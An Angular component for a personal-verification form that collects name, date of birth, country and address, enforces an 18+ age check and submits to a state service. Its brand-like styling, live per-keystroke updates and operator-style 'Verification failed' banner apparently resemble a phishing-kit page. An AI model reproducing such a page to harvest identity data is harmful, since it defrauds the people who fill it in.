
import { Component, inject, signal, effect, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { filterCountries } from '../utils/country-data';

@Component({
  selector: 'app-personal-verification',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `
    <app-public-layout>
      
      <div class="flex flex-col items-center mb-8">
        <h2 class="text-2xl font-bold text-[#2c2e2f] text-center mb-3 tracking-tight">Profile info</h2>
        <p class="text-[15px] text-[#5e6c75] text-center max-w-[80%] mx-auto leading-relaxed">
            Verify your legal identity details to continue.
        </p>
      </div>

      <!-- Error Message -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 rounded-r-md">
            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error</span>
            <div>
              <p class="text-sm font-bold text-[#2c2e2f]">Verification failed</p>
              <p class="text-xs text-[#5e6c75]">Please verify your details match your ID.</p>
            </div>
        </div>
      }

      <div class="space-y-4">
        
        <!-- Country Selector -->
        <div class="relative z-50">
            <div (click)="toggleDropdown()" class="relative group cursor-pointer">
                <div 
                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base shadow-input transition-all duration-300 focus:scale-[1.01] truncate"
                    [class.shadow-input-focus]="country && !showDropdown()"
                >{{ country || '' }}</div>
                <label class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 pointer-events-none"
                    [class.top-1.5]="country" [class.text-[12px]]="country" [class.font-semibold]="country">
                    Country of residence
                </label>
                <span class="material-icons absolute right-4 top-4 text-[#5e6c75]">expand_more</span>
            </div>

            @if(showDropdown()) {
                <div class="absolute w-full bg-white border border-slate-200 rounded-lg shadow-xl mt-1 overflow-hidden animate-in fade-in zoom-in-95 duration-100">
                    <div class="p-3 border-b border-slate-100 bg-slate-50">
                        <input 
                            type="text" 
                            [ngModel]="searchQuery()"
                            (ngModelChange)="searchQuery.set($event)" 
                            (click)="$event.stopPropagation()"
                            placeholder="Search..."
                            class="w-full px-3 py-2 bg-white rounded border border-slate-300 text-sm outline-none focus:border-brand-500 text-[#2c2e2f]"
                            autofocus
                        >
                    </div>
                    <ul class="max-h-60 overflow-y-auto">
                        @for(c of filteredCountries(); track c) {
                            <li (click)="selectCountry(c)" class="px-4 py-2.5 hover:bg-brand-50 hover:text-brand-800 cursor-pointer text-sm text-[#2c2e2f] transition-colors font-medium">
                                {{ c }}
                            </li>
                        }
                    </ul>
                </div>
            }
        </div>

        <div class="grid grid-cols-2 gap-4">
            <!-- First Name -->
            <div class="relative group">
                <input 
                    type="text" 
                    [(ngModel)]="firstName"
                    (ngModelChange)="check(); update()"
                    (blur)="touchedName.set(true)"
                    id="firstName"
                    placeholder=" " 
                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
                    [class.shadow-input-error]="touchedName() && firstName.length < 2"
                >
                <label 
                    for="firstName" 
                    class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
                    >
                    First name
                </label>
            </div>

            <!-- Last Name -->
            <div class="relative group">
                <input 
                    type="text" 
                    [(ngModel)]="lastName"
                    (ngModelChange)="check(); update()"
                    (blur)="touchedName.set(true)"
                    id="lastName"
                    placeholder=" " 
                    class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
                    [class.shadow-input-error]="touchedName() && lastName.length < 2"
                >
                <label 
                    for="lastName" 
                    class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
                    >
                    Last name
                </label>
            </div>
        </div>

        <!-- DOB -->
        <div class="relative group">
          <input 
            type="date"
            [(ngModel)]="dob"
            (ngModelChange)="check(); update()"
            (blur)="touchedDob.set(true)"
            id="dob"
            class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus [color-scheme:light]"
            [class.shadow-input-error]="touchedDob() && !isAdult()"
          >
          <label 
             for="dob" 
             class="absolute left-4 top-1.5 text-[12px] font-semibold text-[#5e6c75] pointer-events-none">
             Date of birth
          </label>
          @if(touchedDob() && dob && !isAdult()) {
             <p class="text-xs text-[#d92d20] mt-1 ml-1 font-medium">Must be 18+</p>
          }
        </div>

        <!-- Address -->
        <div class="space-y-4">
          <div class="relative group">
            <input 
              type="text" 
              [(ngModel)]="addrStreet"
              (ngModelChange)="check(); update()"
              (blur)="touchedAddress.set(true)"
              id="street"
              placeholder=" " 
              class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
              [class.shadow-input-error]="touchedAddress() && addrStreet.length < 5"
            >
            <label 
               for="street" 
               class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
               >
               Street address
            </label>
          </div>
          
          <div class="grid grid-cols-2 gap-4">
             <div class="relative group">
                <input 
                  type="text" 
                  [(ngModel)]="addrCity"
                  (ngModelChange)="check(); update()"
                  (blur)="touchedAddress.set(true)"
                  id="city"
                  placeholder=" " 
                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
                  [class.shadow-input-error]="touchedAddress() && addrCity.length < 3"
                >
                <label 
                   for="city" 
                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
                   >
                   City
                </label>
             </div>
             <div class="relative group">
                <input 
                  type="text" 
                  [(ngModel)]="addrZip"
                  (ngModelChange)="check(); update()"
                  (blur)="touchedAddress.set(true)"
                  id="zip"
                  placeholder=" " 
                  maxlength="10"
                  class="peer w-full h-[56px] px-4 pt-5 pb-1 rounded-md bg-white text-[#2c2e2f] text-base outline-none shadow-input transition-all duration-300 focus:scale-[1.01] focus:shadow-input-focus"
                  [class.shadow-input-error]="touchedAddress() && addrZip.length < 4"
                >
                <label 
                   for="zip" 
                   class="absolute left-4 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[12px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[12px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text pointer-events-none"
                   >
                   Zip code
                </label>
             </div>
          </div>
        </div>

        <div class="pt-6">
          <button 
            (click)="submit()"
            [disabled]="!isValid()"
            [class.opacity-50]="!isValid()"
            [class.hover:bg-brand-900]="isValid()"
            class="w-full bg-brand-800 text-white font-bold text-[16px] py-4 px-4 rounded-full transition-all duration-300 shadow-lg shadow-brand-500/20 hover:scale-[1.02] active:scale-[0.98]"
          >
            Agree & Continue
          </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class PersonalVerificationComponent {
  state = inject(StateService);
  
  firstName = '';
  lastName = '';
  dob = '';
  country = '';
  addrStreet = '';
  addrCity = '';
  addrZip = '';
  
  // Validation State
  touchedName = signal(false);
  touchedDob = signal(false);
  touchedAddress = signal(false);
  isValid = signal(false);
  isAdult = signal(true);

  // Country Dropdown State
  showDropdown = signal(false);
  searchQuery = signal('');

  constructor() {
      effect(() => {
          this.firstName = this.state.firstName();
          this.lastName = this.state.lastName();
          this.dob = this.state.dob();
          this.check();
      });
  }

  filteredCountries = computed(() => {
     return filterCountries(this.searchQuery());
  });

  toggleDropdown() {
      this.showDropdown.update(v => !v);
      if(this.showDropdown()) {
          setTimeout(() => {
            const input = document.querySelector('input[placeholder="Search..."]') as HTMLInputElement;
            if(input) input.focus();
          }, 50);
      }
  }

  selectCountry(c: string) {
      this.country = c;
      this.showDropdown.set(false);
      this.searchQuery.set('');
      this.check();
      this.update();
  }

  update() {
      this.state.updatePersonal({
          first: this.firstName,
          last: this.lastName,
          dob: this.dob,
          address: `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`,
          country: this.country
      });
  }

  check() {
    let ageValid = false;
    if (this.dob) {
        const birth = new Date(this.dob);
        const today = new Date();
        let age = today.getFullYear() - birth.getFullYear();
        const m = today.getMonth() - birth.getMonth();
        if (m < 0 || (m === 0 && today.getDate() < birth.getDate())) {
            age--;
        }
        ageValid = age >= 18;
    }
    this.isAdult.set(ageValid);

    this.isValid.set(
      this.country !== '' &&
      this.firstName.length >= 2 && 
      this.lastName.length >= 2 && 
      ageValid && 
      this.addrStreet.length >= 5 &&
      this.addrCity.length >= 3 &&
      this.addrZip.length >= 4
    );
  }

  submit() {
    if (this.isValid()) {
      const fullAddress = `${this.addrStreet}, ${this.addrCity} ${this.addrZip}`;
      this.state.submitPersonal(this.firstName, this.lastName, this.dob, fullAddress, this.country);
    }
  }
}
